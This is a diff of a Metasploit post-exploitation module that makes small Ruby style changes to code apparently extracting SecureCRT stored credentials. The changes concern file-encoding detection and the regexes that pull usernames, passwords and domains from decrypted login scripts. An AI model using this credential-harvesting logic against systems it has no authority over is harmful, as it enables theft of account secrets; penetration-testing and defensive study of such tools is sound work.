@@ -62,11 +62,11 @@ class MetasploitModule < Msf::Post
 
   def try_encode_file(data)
     if data[0].unpack('C') == [255] && data[1].unpack('C') == [254]
-      data[2..-1].force_encoding('UTF-16LE').encode('UTF-8')
+      data[2..].force_encoding('UTF-16LE').encode('UTF-8')
     elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [187] && data[2].unpack('C') == [191]
       data
     elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [255]
-      data[2..-1].force_encoding('UTF-16BE').encode('UTF-8')
+      data[2..].force_encoding('UTF-16BE').encode('UTF-8')
     else
       data
     end
@@ -96,9 +96,9 @@ class MetasploitModule < Msf::Post
       hostname = file[/"Hostname"=(?<hostname>[^\s]+)/u, 'hostname']
       decrypted_script = securecrt_crypto_v2(file[/"Login Script V3"=02:(?<script>[0-9a-f]+)/u, 'script'])
       if !decrypted_script.nil?
-        username = decrypted_script[/[l]*ogin(?: name)?:\x1F(?<login>\S+)\x1F(?:[\d])\x1F[p]*ass/u, 'login']
-        password = decrypted_script[/[p]*assword:\x1F(?<password>[\S]+)\x1F/u, 'password']
-        domain = decrypted_script[/[Ww]*indows [Dd]*omain:\x1F(?<domain>[\S]+)\x1F/u, 'domain']
+        username = decrypted_script[/l*ogin(?: name)?:\x1F(?<login>\S+)\x1F(?:\d)\x1Fp*ass/u, 'login']
+        password = decrypted_script[/p*assword:\x1F(?<password>\S+)\x1F/u, 'password']
+        domain = decrypted_script[/[Ww]*indows [Dd]*omain:\x1F(?<domain>\S+)\x1F/u, 'domain']
         if !domain.nil? && !username.nil?
           username = "#{domain}\\#{username}"
         end
